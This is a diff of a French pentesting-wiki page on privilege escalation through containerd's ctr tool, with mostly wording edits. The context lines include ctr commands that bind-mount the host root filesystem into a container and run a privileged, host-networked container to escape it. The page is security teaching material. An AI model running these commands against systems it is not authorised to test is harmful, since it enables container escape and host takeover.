@@ -1,10 +1,11 @@
-# Élévation de privilèges Containerd (ctr)
+# Containerd (ctr) Élévation de privilèges
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Informations de base
 
 Allez au lien suivant pour apprendre **ce qu'est containerd** et `ctr` :
+
 
 {{#ref}}
 ../../network-services-pentesting/2375-pentesting-docker.md
@@ -30,12 +31,13 @@ ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:late
 ```
 ## PE 2
 
-Exécutez un conteneur avec des privilèges et échappez-vous.\
+Exécutez un conteneur avec des privilèges et échappez-vous de celui-ci.\
 Vous pouvez exécuter un conteneur privilégié comme :
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-Ensuite, vous pouvez utiliser certaines des techniques mentionnées dans la page suivante pour **vous échapper en abusant des capacités privilégiées** :
+Ensuite, vous pouvez utiliser certaines des techniques mentionnées sur la page suivante pour **vous échapper en abusant des capacités privilégiées** :
+
 
 {{#ref}}
 docker-security/
